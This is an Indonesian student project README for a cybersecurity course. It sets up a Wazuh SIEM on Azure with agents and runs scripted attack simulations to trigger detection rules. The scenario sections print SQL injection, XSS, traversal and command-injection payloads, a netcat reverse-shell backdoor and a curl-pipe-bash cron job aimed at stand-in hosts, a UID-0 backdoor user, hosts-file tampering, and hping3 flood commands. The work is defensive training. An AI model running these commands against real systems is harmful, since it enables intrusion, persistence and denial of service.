# MIKS-C-K4

> **Kelompok:** MIKS-C-K4  
> **Mata Kuliah:** Manajemen Insiden Keamanam Siber
> **Platform:** Wazuh SIEM - Microsoft Azure  
> **Manager IP:** `70.153.19.42`

---

## Anggota Tim

| No | Nama | NRP |
|----|------|-----|
| 1 | Revalina Erica Permatasari | 5027241007 |
| 2 | Syifa Nurul Alfiah | 5027241019 |
| 3 | Salsa Bil Ulla | 5027241052 |
| 4 | Putri Joselina Silitonga | 5027241116 |

---

## Apa Itu Wazuh?

Wazuh adalah platform keamanan open-source yang menyediakan:
- **Intrusion Detection (IDS)** - Deteksi serangan dan aktivitas mencurigakan
- **Log Analysis** - Analisis log sistem secara real-time
- **File Integrity Monitoring (FIM)** - Deteksi perubahan file penting
- **Vulnerability Detection** - Identifikasi kerentanan sistem
- **Security Configuration Assessment (SCA)** - Audit konfigurasi keamanan

---

## Arsitektur Sistem

```
┌──────────────────────────────────────────────────────────────────────┐
│                  CLOUD SERVER (Microsoft Azure)                      │
│                                                                      │
│  ┌────────────────────────────────────────────────────────────────┐  │
│  │              WAZUH MANAGER (All-in-One)                        │  │
│  │                                                                │  │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐ │  │
│  │  │ Wazuh Server │  │  Wazuh       │  │  Wazuh Dashboard     │ │  │
│  │  │ (Manager)    │  │  Indexer     │  │  (Web UI)            │ │  │
│  │  │              │  │  (OpenSearch)│  │  Port: 443           │ │  │
│  │  │ Port: 1514   │  │  Port: 9200  │  │                      │ │  │
│  │  │       1515   │  │              │  │  Visualisasi &       │ │  │
│  │  │ Menerima log │  │  Menyimpan & │  │  Monitoring Alert    │ │  │
│  │  │ dari agent   │  │  indexing    │  │                      │ │  │
│  │  └──────┬───────┘  └─────────────┘  └──────────────────────┘ │  │
│  └─────────┼──────────────────────────────────────────────────────┘  │
│  Public IP: 70.153.19.42                                             │
└────────────┼─────────────────────────────────────────────────────────┘
             │ TCP 1514/1515
     ┌───────┴──────────────┐
     ▼           ▼          ▼
┌─────────┐ ┌─────────┐ ┌─────────┐
│ Agent 1 │ │ Agent 2 │ │ Agent 3 │
│ macOS   │ │ Windows │ │  Kali   │
│(kworung)│ │(Ascala/ │ │ Linux   │
│         │ │DESKTOP) │ │         │
└─────────┘ └─────────┘ └─────────┘
```

| Komponen | Fungsi | Port |
|----------|--------|------|
| Wazuh Manager | Menerima & menganalisis log dari semua agent | 1514, 1515 |
| Wazuh Indexer | Database (OpenSearch) untuk menyimpan alert | 9200 |
| Wazuh Dashboard | Web UI untuk visualisasi & monitoring | 443 |
| Wazuh Agent | Mengumpulkan log di tiap laptop & kirim ke manager | — |

### Alur Kerja Sistem

```
Agent kumpulkan log → kirim ke Manager (TCP 1514, AES encrypted)
→ Manager lakukan rule matching & alert generation
→ Alert disimpan ke Indexer (OpenSearch)
→ Dashboard tampilkan real-time alerts
→ Admin investigasi & response
```

### Topologi Jaringan

```
              ┌─────────────────────┐
              │   INTERNET / CLOUD  │
              │  ┌───────────────┐  │
              │  │  Wazuh Manager│  │
              │  │ 70.153.19.42  │  │
              │  └───────┬───────┘  │
              └──────────┼──────────┘
                         │
              ┌──────────┼──────────┐
              │          │          │
        ┌─────┴────┐ ┌───┴─────┐ ┌─┴────────┐
        │ Agent 1  │ │ Agent 2 │ │ Agent 3  │
        │  macOS   │ │ Windows │ │  Kali    │
        │ WiFi/LAN │ │WiFi/LAN │ │ WiFi/LAN │
        └──────────┘ └─────────┘ └──────────┘
```

NSG Azure yang dibuka: **port 443, 1514, 1515, 9200**

## Struktur Folder Project

```
MIKS-C-K4/
├── README.md                    ← Panduan utama project
├── docs/
│   ├── architecture.md          ← Arsitektur & alur sistem
│   ├── setup-manager.md         ← Setup Wazuh Manager di Azure
│   ├── setup-agent.md           ← Setup Wazuh Agent di tiap laptop
│   ├── setup-malware.md         ← Setup Malware Detection + VirusTotal
│   └── attack-simulation.md     ← Panduan semua simulasi serangan
├── configs/
│   ├── manager/
│   │   └── ossec.conf           ← Konfigurasi manager (+ VirusTotal)
│   └── agent/
│       └── ossec.conf           ← Konfigurasi agent (FIM, log collection)
├── scripts/
│   ├── install-manager.sh       ← Auto-install Wazuh Manager di Azure
│   ├── install-agent.sh         ← Auto-install Wazuh Agent di laptop
│   ├── attack-bruteforce.sh     ← Simulasi SSH Brute Force
│   ├── attack-web.sh            ← Simulasi Web Attack (SQLi/XSS)
│   ├── attack-fim.sh            ← Simulasi File Integrity Monitoring
│   ├── attack-rootkit.sh        ← Simulasi Rootkit Detection
│   ├── attack-ddos.sh           ← Simulasi DDoS Attack
│   ├── attack-malware.sh        ← Simulasi Malware Detection
│   ├── attack-service.bat       ← Simulasi Suspicious Service (Windows)
│   └── privilege-escalation.sh  ← Simulasi Privilege Escalation
├── rules/
│   └── custom-rules.xml         ← Custom detection rules level 10–14
└── Documentation/               ← Screenshot & foto hasil demo
```

---

## Setup Wazuh Manager (Azure)

### Step 1: Pendaftaran Azure for Students

1. Buka [Azure for Students](https://azure.microsoft.com/en-us/free/students/) → klik **Start Free**
2. Login dengan akun Microsoft → masukkan **email kampus** (`.ac.id`) untuk verifikasi
3. Isi data diri → dapatkan credit **$100** untuk menjalankan VM

### Step 2: Membuat Virtual Machine

Di [Azure Portal](https://portal.azure.com/) → **Virtual Machines** → **Create**:

| Setting | Value |
|---------|-------|
| Subscription | Azure for Students |
| Resource Group | `Wazuh-Project` |
| VM Name | `Wazuh-Manager` |
| Region | Southeast Asia (Singapura) |
| Image | Ubuntu Server 22.04 LTS - x64 Gen2 |
| Size | Standard_B2s (2 vCPU, 4GB RAM) |
| Auth | SSH public key atau Password |
| Inbound port | SSH (22) |
| Disk | Standard SSD 30GB |

### Step 3: Konfigurasi Firewall (Networking)

VM → **Settings** → **Networking** → **+ Add inbound port rule**:
- Destination port: `443, 1514, 1515, 9200`
- Protocol: TCP
- Action: Allow
- Name: `Wazuh-Ports`

### Step 4: Login SSH ke Server

```bash
# Pakai SSH Key
ssh -i "nama-key.pem" azureuser@70.153.19.42

# Atau pakai Password
ssh azureuser@70.153.19.42
```

### Step 5: Install Wazuh Manager (All-in-One)

```bash
sudo su

# Download installer
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
curl -sO https://packages.wazuh.com/4.9/config.yml

# Masukkan IP Public Azure ke config.yml
nano config.yml
# Ganti tiga baris "ip: <NODE_IP>" dengan IP Public Azure

# Generate konfigurasi enkripsi
bash wazuh-install.sh --generate-config-files

# Install (butuh ~10-15 menit)
bash wazuh-install.sh --all-in-one
```

### Step 6: Akses Dashboard

Setelah install selesai, terminal menampilkan:
```
INFO: You can access the web interface https://70.153.19.42:443
    User: admin
    Password: <PASSWORD_ACAK>
```

Buka `https://70.153.19.42` → klik **Advanced** → **Proceed** → login dengan `admin`.

![Cloud Server](Documentation/cloud-server.png)
*Azure VM Wazuh Manager yang sudah berjalan*

![System Active](Documentation/system-active.png)
*Status service Wazuh Manager, Indexer, dan Dashboard aktif*

---

## Setup Wazuh Agent (Laptop)

### Metode Termudah: Via Dashboard

1. Buka `https://70.153.19.42` → **Agents** → **Deploy new agent**
2. Pilih OS → masukkan IP Manager → copy-paste command yang digenerate

### Manual — Linux/Kali

```bash
# Import GPG key & repository
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | sudo gpg --no-default-keyring \
  --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import
sudo chmod 644 /usr/share/keyrings/wazuh.gpg
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" \
  | sudo tee -a /etc/apt/sources.list.d/wazuh.list
sudo apt update

# Install agent
WAZUH_MANAGER="70.153.19.42" sudo apt install -y wazuh-agent

# Start agent
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

### Manual — Windows

```cmd
REM Download dari: https://packages.wazuh.com/4.x/windows/wazuh-agent-4.9.0-1.msi
REM Jalankan CMD sebagai Administrator:
wazuh-agent-4.9.0-1.msi /q WAZUH_MANAGER="70.153.19.42" WAZUH_REGISTRATION_SERVER="70.153.19.42"
net start WazuhSvc
```

### Manual — macOS

```bash
curl -so wazuh-agent.pkg https://packages.wazuh.com/4.x/macos/wazuh-agent-4.9.0-1.intel64.pkg
sudo launchctl setenv WAZUH_MANAGER "70.153.19.42" && sudo installer -pkg wazuh-agent.pkg -target /
sudo /Library/Ossec/bin/wazuh-control start
```

### Verifikasi Agent Terhubung

```bash
# Di Manager (SSH ke Azure)
sudo /var/ossec/bin/agent_control -l
```

![List Agent](Documentation/list-agent.png)
*Daftar agent yang terhubung ke Wazuh Manager*

### Konfigurasi Agent — FIM & Log Collection

Edit `/var/ossec/etc/ossec.conf` di agent:

```xml
<syscheck>
  <disabled>no</disabled>
  <frequency>300</frequency>
  <scan_on_start>yes</scan_on_start>
  <directories realtime="yes" check_all="yes">/etc</directories>
  <directories realtime="yes" check_all="yes">/home</directories>
  <directories realtime="yes" check_all="yes">/var/www</directories>
  <directories realtime="yes" check_all="yes">/tmp/fim-test</directories>
</syscheck>

<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/auth.log</location>
</localfile>

<localfile>
  <log_format>apache</log_format>
  <location>/var/log/apache2/access.log</location>
</localfile>
```

Setelah edit, restart agent:
```bash
sudo systemctl restart wazuh-agent          # Linux
net stop WazuhSvc && net start WazuhSvc     # Windows (Admin CMD)
sudo /Library/Ossec/bin/wazuh-control restart  # macOS
```

---

## Setup Malware Detection — VirusTotal Integration

### Step 1: Dapatkan API Key VirusTotal (Gratis)

1. Daftar di [virustotal.com](https://www.virustotal.com)
2. Login → klik ikon profil → **API key**
3. Copy API key (limit gratis: 500 request/hari)

### Step 2: Aktifkan di Wazuh Manager

```bash
ssh wazuh-manager@70.153.19.42
sudo su
nano /var/ossec/etc/ossec.conf
```

Tambahkan di dalam `<ossec_config>` (sebelum tag penutup):

```xml
<!-- VirusTotal Integration -->
<integration>
  <name>virustotal</name>
  <api_key>PASTE_API_KEY_DI_SINI</api_key>
  <rule_id>554,553,550,551</rule_id>
  <alert_format>json</alert_format>
</integration>
```

```bash
systemctl restart wazuh-manager
```

### Step 3: Validasi — EICAR Test File

```bash
# Jalankan di agent
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar-test.txt
# Tunggu 30-60 detik
```

Yang terjadi:
1. Agent deteksi file baru di `/tmp` → FIM alert (Rule 554)
2. Manager kirim hash file ke VirusTotal API
3. VirusTotal balas → file dikenal sebagai EICAR test file
4. Alert muncul di Dashboard: **Rule ID 87105**

Cek di Dashboard: **Modules → Malware Detection** atau filter `rule.id: 87105`

### Troubleshooting VirusTotal

```bash
# Cek log integrasi
sudo tail -f /var/ossec/logs/integrations.log

# Pastikan API key benar
sudo cat /var/ossec/etc/ossec.conf | grep api_key
```

---

## Dashboard Monitoring

![Overview Dashboard](Documentation/overview-dashboard.png)
*Tampilan overview Wazuh Dashboard*

![Overview Dashboard 2](Documentation/overview%20dashboard%20wazuh.png)
*Security Events overview*

![Grafik Threat Hunting](Documentation/grafik%20Threat%20Hunting.png)
*Grafik Threat Hunting — distribusi alert berdasarkan waktu dan rule*

---

## Overview Skenario Serangan

| No | Skenario | Script | Agent | Rule ID | Level |
|----|----------|--------|-------|---------|-------|
| 1 | SSH Brute Force | `attack-bruteforce.sh` | Agent 1 (macOS) | 5710, 5712, 5763, 100001, 100002 | 5–13 |
| 2 | Web Attack (SQL Injection & XSS) | `attack-web.sh` | Agent 2 (Windows) | 31103–31110, 100010–100012 | 6–10 |
| 3 | File Integrity Monitoring (FIM) | `attack-fim.sh` | Agent 3 (Kali) | 550–554, 100020, 100021 | 5–12 |
| 4 | Rootkit & Malware Detection | `attack-rootkit.sh` / `attack-malware.sh` | Semua Agent | 510–514, 87105, 100040, 100041 | 7–14 |
| 5 | Privilege Escalation | `privilege-escalation.sh` | Agent 1 (macOS) | 5401–5404, 100030, 100031 | 5–14 |
| 6 | DDoS Attack | `attack-ddos.sh` | Agent 3 (Kali) | 1002, 20101 | 6–8 |
| 7 | Suspicious Windows Service | `attack-service.bat` | Agent 2 (Windows) | 7036, 7045, 61138 | 3–12 |

---

## Skenario 1: SSH Brute Force Attack

### Deskripsi

SSH Brute Force adalah serangan di mana penyerang mencoba login ke SSH server menggunakan banyak kombinasi username dan password salah secara berulang. Wazuh mendeteksi pola ini dari log autentikasi `/var/log/auth.log` dan memicu alert berdasarkan frekuensi kegagalan login.

### Script: `attack-bruteforce.sh`

Script dijalankan di Agent 1, menggunakan 3 metode berurutan:

**Metode 1 — Failed SSH login (15 percobaan):**
```bash
# Jika sshpass tersedia, langsung SSH dengan password salah
sshpass -p "wrongpassword" ssh hacker@localhost

# Jika tidak, inject langsung ke auth.log via logger
logger -p auth.warning "sshd: Failed password for invalid user hacker_1 from 10.10.10.1 port 2001 ssh2"
```

**Metode 2 — Multiple username brute force:**
```bash
USERS=("admin" "root" "test" "user" "ubuntu" "mysql" "postgres")
for user in "${USERS[@]}"; do
    logger -p auth.warning "sshd: Failed password for ${user} from 192.168.1.100 port 22 ssh2"
done
```

**Metode 3 — Rapid-fire 30 percobaan cepat (trigger alert level tinggi):**
```bash
for i in $(seq 1 30); do
    logger -p auth.crit "sshd: Failed password for invalid user attacker from 10.0.0.66 port $((3000+i)) ssh2"
    sleep 0.1
done
```

Metode ketiga mengirim log dengan prioritas `auth.crit` dalam interval 0.1 detik — cukup cepat untuk memicu rule brute force di Wazuh.

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 5710 | Attempt to login using a non-existent user | 5 |
| 5712 | Multiple authentication failures | 10 |
| 5763 | SSH brute force attack detected | 12 |
| 100001 | [Custom] SSH Brute Force — 5+ failed login dalam 2 menit | 10 |
| 100002 | [Custom] Massive SSH Brute Force — 10+ failed login | 13 |

### Cara Jalankan
```bash
bash scripts/attack-bruteforce.sh
# atau targetkan ke agent lain
bash scripts/attack-bruteforce.sh <IP_TARGET>
```

### Hasil di Terminal

![Bruteforce Terminal](Documentation/bruteforce.jpeg)
*Output terminal saat script brute force dijalankan — terlihat 943 hits terdeteksi di Threat Hunting Dashboard dengan rule ID 5710*

### Cara Cek di Dashboard
```
Security Events → filter:
rule.id: 5710 OR rule.id: 5712 OR rule.id: 5763
agent.name: <nama_agent>
```

---

## Skenario 2: Web Attack (SQL Injection & XSS)

### Deskripsi

SQL Injection (SQLi) dan Cross-Site Scripting (XSS) adalah dua jenis serangan aplikasi web yang masuk OWASP Top 10. SQLi memanipulasi query database, XSS menyisipkan skrip berbahaya ke halaman web. Wazuh mendeteksi serangan ini dari log akses Apache.

### Script: `attack-web.sh`

Dijalankan di Agent 2, mengirim 32 HTTP request berbahaya via `curl`:

**1. SQL Injection (10 payload):**
```bash
curl "http://localhost/index.html?id=1' OR '1'='1"
curl "http://localhost/login?user=admin'--"
curl "http://localhost/search?q=1 UNION SELECT * FROM users--"
curl "http://localhost/page?id=1; DROP TABLE users;--"
curl "http://localhost/api?param=' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables--"
# + 5 payload lainnya
```

**2. XSS — Cross-Site Scripting (8 payload):**
```bash
curl "http://localhost/search?q=<script>alert('XSS')</script>"
curl "http://localhost/page?name=<img src=x onerror=alert(1)>"
curl "http://localhost/comment?text=<svg/onload=alert('hacked')>"
# + 5 payload lainnya
```

**3. Directory Traversal (6 payload):**
```bash
curl "http://localhost/page?file=../../../etc/passwd"
curl "http://localhost/download?path=....//....//etc/shadow"
curl "http://localhost/include?page=..%2F..%2F..%2Fetc%2Fpasswd"
```

**4. Command Injection (5 payload):**
```bash
curl "http://localhost/exec?cmd=;cat /etc/passwd"
curl "http://localhost/ping?host=;id"
curl "http://localhost/shell?input=\$(cat /etc/shadow)"
```

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 31103 | SQL injection attempt | 6 |
| 31104 | XSS (Cross-Site Scripting) attempt | 6 |
| 31105 | Directory traversal attempt | 6 |
| 31110 | Multiple web attack patterns | 10 |
| 100010 | [Custom] SQL Injection di URL | 10 |
| 100011 | [Custom] XSS di URL | 10 |
| 100012 | [Custom] Directory Traversal | 10 |

### Cara Jalankan
```bash
bash scripts/attack-web.sh localhost
# atau ke agent lain
bash scripts/attack-web.sh <IP_TARGET>
```

### Hasil di Terminal

![SQL Terminal](Documentation/sql.jpeg)
*Output terminal saat attack-web.sh dijalankan — terlihat payload SQL Injection dan XSS dikirim satu per satu*

### Hasil di Dashboard

![SQL Dashboard](Documentation/sqlout.jpeg)
*Wazuh Dashboard menampilkan alert web attack dari agent — rule ID 31103–31110 terpicu*

### Cara Cek di Dashboard
```
Security Events → filter:
rule.groups: web OR rule.groups: attack
agent.name: DESKTOP-8EBI1VU
```

---

## Skenario 3: File Integrity Monitoring (FIM)

### Deskripsi

FIM adalah mekanisme yang memantau perubahan file dan direktori sensitif secara real-time. Wazuh menggunakan modul `syscheck` yang menghitung checksum file. Setiap perubahan — penambahan, modifikasi, penghapusan, atau perubahan permission — langsung memicu alert.

### Script: `attack-fim.sh`

Dijalankan di Agent 3 dengan `sudo`. Script mensimulasikan 6 tahap serangan:

**Tahap 1 — Buat file sensitif:**
```bash
echo "DATABASE_URL=mysql://admin:password123@localhost:3306/production" > /tmp/fim-test/database.env
echo "API_KEY=sk-live-1234567890abcdef" > /tmp/fim-test/api-keys.txt
echo "AWS_SECRET=AKIAIOSFODNN7EXAMPLE" > /tmp/fim-test/aws-credentials.txt
# Tunggu 30 detik → Wazuh scan awal & catat hash asli
```

**Tahap 2 — Modifikasi isi file (simulasi tamper):**
```bash
echo "DATABASE_URL=mysql://hacker:pwned@evil-server.com:3306/stolen" > /tmp/fim-test/database.env
echo "API_KEY=sk-live-STOLEN_BY_ATTACKER" > /tmp/fim-test/api-keys.txt
# Hash berubah → Wazuh alert!
```

**Tahap 3 — Ubah permission (melemahkan keamanan):**
```bash
chmod 777 /tmp/fim-test/database.env   # world-readable/writable
chmod 777 /tmp/fim-test/api-keys.txt
chown nobody:nogroup /tmp/fim-test/aws-credentials.txt
```

**Tahap 4 — Hapus file (menghapus jejak):**
```bash
rm -f /tmp/fim-test/aws-credentials.txt
```

**Tahap 5 — DNS hijacking simulation:**
```bash
echo "10.10.10.10 google.com"   >> /etc/hosts
echo "10.10.10.10 facebook.com" >> /etc/hosts
echo "10.10.10.10 bank.com"     >> /etc/hosts
```

**Tahap 6 — Buat script berbahaya:**
```bash
# Simulated backdoor (tidak fungsional)
cat > /tmp/fim-test/backdoor.sh << 'SCRIPT'
#!/bin/bash
while true; do
    nc -e /bin/bash attacker.com 4444 2>/dev/null
    sleep 60
done
SCRIPT
chmod +x /tmp/fim-test/backdoor.sh

# Simulated keylogger (tidak fungsional)
cat > /tmp/fim-test/keylogger.py << 'SCRIPT'
#!/usr/bin/env python3
print("This is a simulated keylogger for demo purposes only")
SCRIPT
chmod +x /tmp/fim-test/keylogger.py
```

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 554 | File added to monitored directory | 5 |
| 550 | Integrity checksum changed | 7 |
| 553 | File deleted from monitored directory | 7 |
| 100020 | [Custom] File konfigurasi diubah di `/etc/` | 10 |
| 100021 | [Custom] File executable sistem dimodifikasi | 12 |

### Cara Jalankan
```bash
sudo bash scripts/attack-fim.sh
```

### Cleanup (wajib setelah demo)
```bash
sudo cp /etc/hosts.backup.fim-demo /etc/hosts
sudo rm -rf /tmp/fim-test
sudo rm /etc/hosts.backup.fim-demo
```

### Hasil di Terminal

![FIM Terminal](Documentation/attack-fim.png)
*Output terminal saat attack-fim.sh dijalankan — menampilkan 6 tahap simulasi*

### Hasil di Dashboard

![FIM Dashboard](Documentation/dashboard%20FIM.png)
*Dashboard FIM Wazuh — menampilkan file yang ditambah, diubah, dan dihapus*

![FIM Dashboard 2](Documentation/dashboard%20FIM%202.png)
*Detail event FIM — terlihat syscheck.path, jenis perubahan (added/modified/deleted)*

![Grafik FIM](Documentation/grafik%20FIM.png)
*Grafik distribusi alert FIM berdasarkan waktu*

### Hasil di Dashboard (fileout)

![File Out](Documentation/fileout.jpeg)
*Threat Hunting menampilkan syscheck.path untuk tiap file yang berubah: backdoor.sh, keylogger.py, aws-credentials.txt, /etc/hosts*

### Cara Cek di Dashboard
```
Integrity Monitoring module → atau:
Security Events → filter: rule.groups: syscheck
agent.name: DESKTOP-8EBI1VU
```

---

## Skenario 4: Rootkit & Malware Detection

### Deskripsi

Rootkit adalah software berbahaya yang menyembunyikan keberadaannya dari sistem operasi. Wazuh mendeteksi indikator rootkit melalui modul `rootcheck` yang memeriksa file tersembunyi, proses tersembunyi, dan user mencurigakan. Integrasi VirusTotal menambah kemampuan deteksi berbasis hash file.

### Script: `attack-rootkit.sh`

Dijalankan di Agent 3 dengan `sudo`:

**Simulasi 1 — Hidden file (indikator rootkit):**
```bash
touch /dev/.hidden_backdoor
touch /dev/.secret_channel
touch /usr/bin/.covert_tool
mkdir -p /tmp/.hidden_dir
echo "C2 server: evil.com:8080" > /tmp/.hidden_dir/.config
```

**Simulasi 2 — User mencurigakan:**
```bash
useradd -M -s /bin/bash backdoor_user
useradd -M -s /bin/bash hacker
# User dengan UID 0 = hak setara root!
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash superroot
```

**Simulasi 3 — Proses mencurigakan:**
```bash
# Fake crypto miner
nohup bash -c 'while true; do echo "mining..." > /dev/null; sleep 60; done' &

# Background process mencurigakan
nohup bash -c 'while true; do sleep 30; done' &
```

**Simulasi 4 — Network backdoor:**
```bash
nc -l -p 4444 &   # backdoor listener
nc -l -p 8888 &   # backdoor listener cadangan
```

**Simulasi 5 — Crontab berbahaya (persistensi):**
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_dir/.config") | crontab -
(crontab -l 2>/dev/null; echo "0 * * * * curl http://evil.com/payload.sh | bash") | crontab -
```

### Script: `attack-malware.sh`

```bash
# Step 1: EICAR Test File (standar uji antivirus internasional)
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar-malware-test.txt

# Step 2: File tersembunyi mencurigakan
touch /tmp/.hidden_payload_demo
touch /tmp/.c2_beacon_demo
echo '#!/bin/bash' > /tmp/.backdoor_demo.sh
echo 'nc -e /bin/bash 192.168.1.100 4444' >> /tmp/.backdoor_demo.sh
chmod +x /tmp/.backdoor_demo.sh

# Step 3: Injeksi log aktivitas malware
for i in $(seq 1 5); do
    logger -p user.warning "MALWARE_DEMO: Suspicious process spawn - /tmp/.backdoor_demo.sh"
    logger -p user.warning "MALWARE_DEMO: Outbound connection to 192.168.1.100:4444"
    logger -p user.warning "MALWARE_DEMO: Hidden file detected in /tmp - possible C2 beacon"
done

# Step 4: Simulasi pola cryptominer
for i in $(seq 1 3); do
    logger -p user.warning "MALWARE_DEMO: High CPU process - possible cryptominer"
    logger -p user.warning "MALWARE_DEMO: Connection to mining pool: pool.demo-miner.com:3333"
done
```

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 510 | Host-based anomaly detection (hidden file/dir) | 7 |
| 512 | Rootkit detection: hidden file in /dev | 7 |
| 5901 | New user account created | 8 |
| 5903 | Non-root user with UID 0 (potential backdoor) | 12 |
| 87103 | VirusTotal: No records found (possible custom malware) | 3 |
| 87104 | VirusTotal: Alert — file flagged | 3 |
| 87105 | VirusTotal: Malware detected | 15 |
| 100031 | [Custom] User baru dengan root privileges (UID 0) | 14 |
| 100040 | [Custom] Netcat listener terdeteksi (potential backdoor) | 12 |
| 100041 | [Custom] Reverse shell attempt terdeteksi | 14 |

### Cara Jalankan
```bash
sudo bash scripts/attack-rootkit.sh
bash scripts/attack-malware.sh
```

### Cleanup (wajib setelah demo)
```bash
sudo rm -f /dev/.hidden_backdoor /dev/.secret_channel /usr/bin/.covert_tool
sudo rm -rf /tmp/.hidden_dir /tmp/.hidden_payload_demo /tmp/.c2_beacon_demo /tmp/.backdoor_demo.sh
sudo userdel backdoor_user 2>/dev/null
sudo userdel hacker 2>/dev/null
sudo userdel superroot 2>/dev/null
kill $(cat /tmp/demo_pids.txt) 2>/dev/null
crontab /tmp/crontab_backup.txt
```

### Hasil di Terminal

![Malware Terminal](Documentation/malware.jpeg)
*Output terminal attack-malware.sh — 4 langkah simulasi selesai dengan status [DONE]*

### Hasil di Dashboard

![Malware Dashboard](Documentation/malwareout.jpeg)
*Threat Hunting menampilkan 34 hits — rule ID 510 dengan deskripsi "Trojaned version of file detected" dan "Process hidden from kill command"*

![Grafik Malware](Documentation/grafik%20malware%20detection.png)
*Grafik distribusi alert Malware Detection*

### VirusTotal Integration

![VirusTotal](Documentation/grafik%20virus%20total.png)
*Grafik hasil VirusTotal integration — file yang dipindai otomatis saat muncul di direktori yang dimonitor*

![VirusTotal 2](Documentation/grafik%20virus%20total%202.png)

![VirusTotal 3](Documentation/grafik%20virus%20total%203.png)

![VirusTotal Out](Documentation/virtout.jpeg)
*Threat Hunting — rule ID 87103 "No records in VirusTotal" dan 87104 "VirusTotal Alert" dari agent kworung*

### Cara Cek di Dashboard
```
Security Events → filter:
rule.groups: rootcheck
agent.name: kworung

Atau untuk VirusTotal:
rule.id: 87103 OR rule.id: 87104 OR rule.id: 87105
```

---

## Skenario 5: Privilege Escalation

### Deskripsi

Privilege Escalation adalah serangan di mana penyerang dengan akses terbatas berusaha mendapatkan hak superuser (root). Wazuh mendeteksi pola ini dari log `sudo` dan `su` di `/var/log/auth.log`.

### Script: `privilege-escalation.sh`

Dijalankan di Agent 1:

```bash
# Simulasi 20 iterasi sudo & su failure
sudo bash -c 'for i in $(seq 1 20); do
    echo "$(date "+%b %d %T") kworung sudo: auth failure; logname=hacker uid=1000 \
    euid=0 tty=/dev/pts/0 ruser=hacker rhost= user=root" >> /var/log/auth.log

    echo "$(date "+%b %d %T") kworung su[$$]: BAD SU hacker to root on /dev/pts/0" \
    >> /var/log/auth.log
    sleep 0.2
done'
```

Setiap iterasi menginjeksikan 2 entri log:
1. Kegagalan `sudo` — field `uid=1000 euid=0` menandakan user biasa mencoba akses root
2. Kegagalan `su` dari user `hacker` ke `root`

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 5401 | Unsuccessful sudo command | 5 |
| 5404 | 3+ consecutive sudo failures | 9 |
| 5301 | su session failed | 5 |
| 100030 | [Custom] Multiple sudo failures — 3+ dalam 2 menit | 10 |
| 100031 | [Custom] User baru dengan UID 0 (root equivalent) | 14 |

### Hasil di Terminal

![Priv Terminal](Documentation/priv.jpeg)
*Output terminal — field uid=1000 euid=0 terlihat jelas, menunjukkan user biasa coba akses root*

### Hasil di Dashboard

![Priv Dashboard](Documentation/privout.jpeg)
*Dashboard menampilkan alert rule level 9 "User missed the password to change UID to root" — rule.firedtimes terus naik (36, 37, 38, 39, 40)*

### Cara Cek di Dashboard
```
Security Events → filter:
rule.id: 5401 OR rule.id: 5404
agent.name: kworung
```

---

## Skenario 6: DDoS Attack

### Deskripsi

DDoS (Distributed Denial of Service) adalah serangan yang bertujuan membanjiri server dengan traffic sehingga tidak dapat melayani request normal. Script mensimulasikan SYN flood, UDP flood, HTTP flood, dan ICMP flood ke Wazuh Manager.

> **Catatan:** Wazuh adalah host-based IDS, bukan network-based. Deteksi DDoS sebagian besar berasal dari log `logger` yang diinjeksikan secara manual, bukan langsung dari traffic `hping3`.

### Script: `attack-ddos.sh`

Target: `70.153.19.42` (Wazuh Manager Azure)

**[1/5] SYN Flood:**
```bash
sudo hping3 -S --flood -V -p 80 70.153.19.42 -c 500
# Fallback jika hping3 tidak ada:
for i in $(seq 1 50); do
    logger -t "ddos-simulation" "SYN flood attempt $i to 70.153.19.42:80"
done
```

**[2/5] UDP Flood:**
```bash
sudo hping3 --udp --flood -p 53 70.153.19.42 -c 300
```

**[3/5] HTTP Flood (Layer 7):**
```bash
for i in $(seq 1 100); do
    curl -s -o /dev/null "http://70.153.19.42/?flood=$i" &
done
wait
```

**[4/5] ICMP Flood:**
```bash
sudo hping3 --icmp --flood 70.153.19.42 -c 200
```

**[5/5] Connection Exhaustion + Log anomali:**
```bash
for i in $(seq 1 50); do
    (echo "" | nc -w 1 70.153.19.42 80 2>/dev/null) &
done
wait
for i in $(seq 1 30); do
    logger -t "kernel" "POSSIBLE DDoS ATTACK: $i connections from 70.153.19.42"
    logger -t "ddos-simulation" "HIGH TRAFFIC ANOMALY: connection flood detected attempt $i"
done
```

### Rule yang Terpicu

| Rule ID | Deskripsi | Level |
|---------|-----------|-------|
| 1002 | Unknown/anomalous system event | 6 |
| 20101 | High traffic anomaly detected | 8 |

> Deteksi DDoS lewat custom rules tidak ada secara spesifik — alert yang muncul mayoritas berasal dari rule bawaan Wazuh level medium (6–8) via log injection `logger`.

### Cara Jalankan
```bash
sudo bash scripts/attack-ddos.sh
```

### Hasil di Dashboard

![DDoS Terminal](Documentation/attack-ddos.png)
*Output terminal script attack-ddos.sh*

![DDoS Dashboard](Documentation/dashboard%20ddos%20attack.png)
*Dashboard menampilkan spike alert saat DDoS simulation dijalankan*

![DDoS Dashboard 2](Documentation/dashboard%20ddos%20attack%202.png)
*Detail event DDoS — terlihat log anomali dari logger injection*

### Cara Cek di Dashboard
```
Security Events → filter:
rule.groups: attack OR rule.groups: ddos
agent.name: DESKTOP-8EBI1VU
```

---

## Skenario 7: Suspicious Windows Service

### Deskripsi

